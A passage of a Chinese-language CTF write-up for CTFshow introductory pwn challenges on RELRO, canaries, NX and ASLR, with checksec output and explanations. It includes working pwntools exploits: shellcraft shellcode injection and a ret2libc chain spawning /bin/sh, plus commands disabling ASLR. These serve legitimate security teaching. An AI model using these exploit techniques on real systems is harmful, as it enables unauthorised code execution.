mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00</span><br><span class="line">   01     .interp</span><br><span class="line">   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn.rela.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame</span><br><span class="line">   03     .init_array .fini_array .dynamic .got .got.plt .data .bss  <span class="comment">#该段具有 RW（可读可写）权限</span></span><br><span class="line">   04     .dynamic</span><br><span class="line">   05     .note.ABI-tag .note.gnu.build-id</span><br><span class="line">   06     .eh_frame_hdr</span><br><span class="line">   07</span><br><span class="line">   08     .init_array .fini_array .dynamic .got  <span class="comment">#包含 .got，但不包含 .got.plt   这表明：GOT 的前半部分（.got） 在程序加载后可能被标记为只读（由 GNU_RELRO 控制），防止被篡改。GOT.PLT（.got.plt） 通常仍保持可写，用于动态解析函数地址。</span></span><br></pre></td></tr></table></figure><p>可以看到程序头多了GNU_RELRO，将.dynamic 、.got标记为只读权限（R），那么在重定向完成后，动态链接器就会将这个区域保护起来。</p><p>在写.got表的时候就会抛出异常，而写.got.plt依旧正常</p><h2 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：提交ctfshow&#123;【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】&#125;</span><br><span class="line">例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</span><br><span class="line">最终flag为ctfshow&#123;1_1_0x400820_0x8208820&#125;</span><br><span class="line">若某个表不存在，则无需写其对应地址</span><br><span class="line">如不存在.got.plt表，则最终flag值为ctfshow&#123;1_0_0x400820&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn 0x600fc0</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>在写.got表的时候就会抛出异常，而.got.plt不存在</p><p>故flag:ctfshow{0_0_0x600fc0}</p><h6 id="分析过程：-5"><a href="#分析过程：-5" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位现在完全开启了RELRO保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -S pwn</span><br><span class="line">There are 28 section headers, starting at offset 0x1900:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000400238  00000238</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 3] .note.gnu.bu[...] NOTE             0000000000400274  00000274</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298</span><br><span class="line">       000000000000001c  0000000000000000   A       5     0     8</span><br><span class="line">  [ 5] .dynsym           DYNSYM           00000000004002b8  000002b8</span><br><span class="line">       0000000000000090  0000000000000018   A       6     1     8</span><br><span class="line">  [ 6] .dynstr           STRTAB           0000000000400348  00000348</span><br><span class="line">       000000000000004b  0000000000000000   A       0     0     1</span><br><span class="line">  [ 7] .gnu.version      VERSYM           0000000000400394  00000394</span><br><span class="line">       000000000000000c  0000000000000002   A       5     0     2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED          00000000004003a0  000003a0</span><br><span class="line">       0000000000000020  0000000000000000   A       6     1     8</span><br><span class="line">  [ 9] .rela.dyn         RELA             00000000004003c0  000003c0</span><br><span class="line">       0000000000000030  0000000000000018   A       5     0     8</span><br><span class="line">  [10] .rela.plt         RELA             00000000004003f0  000003f0</span><br><span class="line">       0000000000000048  0000000000000018  AI       5    21     8</span><br><span class="line">  [11] .init             PROGBITS         0000000000400438  00000438</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [12] .plt              PROGBITS         0000000000400450  00000450</span><br><span class="line">       0000000000000040  0000000000000010  AX       0     0     16</span><br><span class="line">  [13] .text             PROGBITS         0000000000400490  00000490</span><br><span class="line">       0000000000000252  0000000000000000  AX       0     0     16</span><br><span class="line">  [14] .fini             PROGBITS         00000000004006e4  000006e4</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [15] .rodata           PROGBITS         00000000004006f0  000006f0</span><br><span class="line">       000000000000053a  0000000000000000   A       0     0     8</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c</span><br><span class="line">       000000000000003c  0000000000000000   A       0     0     4</span><br><span class="line">  [17] .eh_frame         PROGBITS         0000000000400c68  00000c68</span><br><span class="line">       0000000000000100  0000000000000000   A       0     0     8</span><br><span class="line">  [18] .init_array       INIT_ARRAY       0000000000600dc0  00000dc0</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .fini_array       FINI_ARRAY       0000000000600dc8  00000dc8</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .dynamic          DYNAMIC          0000000000600dd0  00000dd0</span><br><span class="line">       00000000000001f0  0000000000000010  WA       6     0     8</span><br><span class="line">  [21] .got              PROGBITS         0000000000600fc0  00000fc0</span><br><span class="line">       0000000000000040  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .data             PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [23] .bss              NOBITS           0000000000601010  00001010</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [24] .comment          PROGBITS         0000000000000000  00001010</span><br><span class="line">       0000000000000029  0000000000000001  MS       0     0     1</span><br><span class="line">  [25] .symtab           SYMTAB           0000000000000000  00001040</span><br><span class="line">       00000000000005d0  0000000000000018          26    42     8</span><br><span class="line">  [26] .strtab           STRTAB           0000000000000000  00001610</span><br><span class="line">       00000000000001f1  0000000000000000           0     0     1</span><br><span class="line">  [27] .shstrtab         STRTAB           0000000000000000  00001801</span><br><span class="line">       00000000000000fa  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure><p>可以看到已经没有了.got.plt,而且.got也是不可写的</p><h2 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</span><br><span class="line">     ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">     不是nc连接</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">The authenticity of host <span class="string">&#x27;lpwn,challenge.ctf,show]:28198 ([124.223.158.81]:28198)&#x27;</span>can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:PC6yCxGdKk51w8EXuEj0+Id4t/qL5AN1o0bgwj20yw.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[pwn,challenge,ctf.show]:28198,[124.223,158.81]:28198’(EcDsA) to the list of known hosts.</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ ./pwnme aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">* Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">* Type  : Linux_Security_Mechanisms     </span></span><br><span class="line"><span class="string">* Site  : https://ctf.show/    </span></span><br><span class="line"><span class="string">* Hint  : No canary found     </span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">How to input ?</span></span><br><span class="line"><span class="string">ctfshow&#123;...&#125;</span></span><br></pre></td></tr></table></figure><h6 id="分析过程：-6"><a href="#分析过程：-6" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位开启NX保护，部分开启RELRO保护</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How to input ?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">1</span> )</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">58</span>]; <span class="comment">// [esp+Ah] [ebp-3Eh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>首先，程序尝试打开名为”&#x2F;ctfshow_flag”的文件，并将文件指针赋值给 stream 变量。如果打开文件失败（文件不存在或无法访问），程序输出错误消息并终止。</p></li><li><p>如果成功打开文件，程序使用 fgets 函数从文件中读取最多64个字符到名为 flag 的缓冲区。</p></li><li><p>程序输出提示消息：”How to input ?”。</p></li><li><p>如果程序运行时传入了命令行参数（ argc 大于1），则调用 ctfshow 函数，并将第一个命令行参数作为参数传递给该函数。</p></li><li><p>ctfshow 函数很简单，它接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名为 dest 的缓冲区中。然后，它返回指向 dest 缓冲区的指针。</p></li></ol><p>这里仅仅是为了演示当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞。</p><p>详细原理在后续会再进行详细讲解。</p><h2 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h2><p>Hint：你可以使用pwntools的shellcraft模块来进行攻击</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : NX disabled &amp; Has RWX segments</span><br><span class="line">    * *************************************</span><br><span class="line">jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814<span class="variable">$ri</span>\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX̀</span><br><span class="line">\xe7k\xe8F</span><br><span class="line">$ <span class="built_in">cat</span> /ctfshow_flag</span><br><span class="line">[DEBUG] Sent 0x12 bytes:</span><br><span class="line">    <span class="string">&#x27;cat ctfshow_flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    <span class="string">&#x27;ctfshow&#123;...&#125;\n&#x27;</span></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程：-7"><a href="#分析过程：-7" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX disabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure><p>32位仅部分开启RELRO保护</p><p>可以看到存在一个RWX权限的段，即可读可写可执行的段</p><p>直接IDA查看main函数发现有一个ctfshow函数，但是无法跟进</p><p>那么就直接看汇编了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080484C6                 public ctfshow</span><br><span class="line">.text:080484C6 ctfshow         proc near               ; CODE XREF: main+132↓p</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 buf             = byte ptr -88h</span><br><span class="line">.text:080484C6 var_4           = dword ptr -4</span><br><span class="line">.text:080484C6 p_argc          = dword ptr  8</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 ; __unwind &#123;</span><br><span class="line">.text:080484C6                 push    ebp</span><br><span class="line">.text:080484C7                 mov     ebp, esp</span><br><span class="line">.text:080484C9                 push    ebx</span><br><span class="line">.text:080484CA                 sub     esp, 84h</span><br><span class="line">.text:080484D0                 call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:080484D5                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:080484DB                 sub     esp, 4</span><br><span class="line">.text:080484DE                 push    100h            ; nbytes</span><br><span class="line">.text:080484E3                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484E9                 push    eax             ; buf</span><br><span class="line">.text:080484EA                 push    0               ; fd</span><br><span class="line">.text:080484EC                 call    _read</span><br><span class="line">.text:080484F1                 add     esp, 10h</span><br><span class="line">.text:080484F4                 sub     esp, 0Ch</span><br><span class="line">.text:080484F7                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484FD                 push    eax             ; s</span><br><span class="line">.text:080484FE                 call    _puts</span><br><span class="line">.text:08048503                 add     esp, 10h</span><br><span class="line">.text:08048506                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804850C                 call    eax</span><br><span class="line">.text:0804850E                 nop</span><br><span class="line">.text:0804850F                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08048512                 leave</span><br><span class="line">.text:08048513                 retn</span><br><span class="line">.text:08048513 ; &#125; // starts at 80484C6</span><br><span class="line">.text:08048513 ctfshow         endp</span><br></pre></td></tr></table></figure><ol><li>函数开始时进行一些栈操作，保存寄存器的值。</li><li>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</li><li>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</li><li>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</li><li>调用 puts 函数，将缓冲区的内容打印到标准输出。</li><li>通过调用 call eax 指令，以 eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执</li></ol><p>行。</p><ol start="7"><li>之后是一些清理工作和函数返回的准备操作。</li></ol><p>可能这里看得还是云里雾里，后面慢慢会逐步清晰起来。但实际上这题题目提示了可以使用pwntools的shellcraft模块进行攻击</p><p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</p><p>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p><p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p><p>那么我们可以直接尝试编写exp进行攻击</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment"># 导入 pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) # 本地连接</span></span><br><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>, 端口) <span class="comment"># 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment"># 生成一个 Shellcode</span></span><br><span class="line">io.sendline(shellcode) <span class="comment"># 将生成的 Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive() <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></table></figure><h2 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h2><p>Hint：开启NX保护，或许可以试试ret2libc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;pwn.challenge.ctf.show&quot;, 28177)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) +p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system) + p32(main) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : NX disabled &amp; Has RWX segments</span><br><span class="line">    * *************************************</span><br><span class="line">jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814<span class="variable">$ri</span>\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX̀</span><br><span class="line">\xe7k\xe8F</span><br><span class="line">$ <span class="built_in">cat</span> /ctfshow_flag</span><br><span class="line">[DEBUG] Sent 0x12 bytes:</span><br><span class="line">    <span class="string">&#x27;cat ctfshow_flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    <span class="string">&#x27;ctfshow&#123;...&#125;\n&#x27;</span></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程：-8"><a href="#分析过程：-8" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>32位开启NX保护，部分开启RELRO保护</p><p>具体攻击手法为：ret2libc</p><p>（即先找到栈溢出漏洞，通过write函数泄露 write 函数的真实地址，根据泄露的 write 函数地址，使用 LibcSearcher 来搜索 libc 库中相应的函数地址和字符串地址，获取 system 函数和”&#x2F;bin&#x2F;sh” 字符串的地址。构造新的 payload，使用泄露的 system 函数和 “&#x2F;bin&#x2F;sh” 字符串的地址来进行get shell）</p><p>这里的内容为后续栈部分讲解内容，目前WP在前面不做详细讲解，目的仅为了演示在开启某些保护可以使用哪些攻击手法</p><h2 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h2><p>Hint：设置好 ALSR 保护参数值即可获得flag<br>为确保flag正确，本题建议用提供虚拟机运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line">If the result is 0, <span class="keyword">then</span> you get the correct flag!</span><br><span class="line">If not,you will get a fake flag!</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560_0xc45b2a0_0x76042988a6b0&#125;</span><br><span class="line">$ <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br><span class="line">rhea@rhea-VMware-Virtual-Platform:~$ <span class="built_in">sudo</span> docker run -it --privileged --<span class="built_in">rm</span> pwnenv_ubuntu24 /bin/bash</span><br><span class="line">root@5c9e7214e2da:/# <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@5c9e7214e2da:/# <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line">0</span><br><span class="line">$ ./pwn</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">If the result is 0, <span class="keyword">then</span> you get the correct flag!</span><br><span class="line">If not,you will get a fake flag!</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560_0x6032a0_0x7ffff7fbd6b0&#125;</span><br></pre></td></tr></table></figure><p>所以应该先执行echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space[不行的话 sudo sh -c ‘echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space’重定向]</p><p>再运行程序即可得到正确的flag</p><p>flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p><h6 id="分析过程：-9"><a href="#分析过程：-9" class="headerlink" title="分析过程："></a>分析过程：</h6><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置，从而增加了利用软件漏洞进行攻击的难度。</p><p>开启不同等级会有不同的效果：</p><ol><li><p>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和代码的位置。</p></li><li><p>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p></li><li><p>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。</p></li><li><p>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，使得攻击者无法轻易地覆盖返回地址或控制程序流程。</p></li></ol><p>在Linux中，ALSR的全局配置&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space有三种情况：</p><p>0表示关闭ALSR</p><p>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</p><p>2表示完全开启</p><hr><table><thead><tr><th><strong>ALSR</strong></th><th><strong>Executable</strong></th><th><strong>PLT</strong></th><th>Heap</th><th><strong>Stack</strong></th><th>Shared libraies</th></tr></thead><tbody><tr><td>0</td><td>×</td><td>×</td><td>×</td><td>×</td><td>×</td></tr><tr><td>1</td><td>×</td><td>×</td><td>×</td><td>√</td><td>√</td></tr><tr><td>2</td><td>×</td><td>×</td><td>√</td><td>√</td><td>√</td></tr><tr><td>2+PIE</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><hr><h2 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h2><p>Hint：设置好 ALSR 保护参数值即可获得flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">If the result is 0 or 1, <span class="keyword">then</span> you get the correct flag!</span><br><span class="line">If not,you will get a fake flag!</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560_0x6032a0&#125;</span><br></pre></td></tr></table></figure><p>故flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p><h6 id="分析过程：-10"><a href="#分析过程：-10" class="headerlink" title="分析过程："></a>分析过程：</h6><p>同理pwn26</p><h2 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h2><p>Hint：设置好 ALSR 保护参数值即可获得flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560&#125;</span><br><span class="line">...</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">1</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560&#125;</span><br><span class="line">...</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560&#125;</span><br></pre></td></tr></table></figure><p>此时不管等级为0 1 2 ，函数本身地址不会变化（在未开启PIE的情况下）</p><p>故flag:ctfshow{0x400687_0x400560}</p><h6 id="分析过程：-11"><a href="#分析过程：-11" class="headerlink" title="分析过程："></a>分析过程：</h6><p>同理pwn26</p><h2 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h2><p>Hint：ASLR和PIE开启后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">sh: 1: cannot create 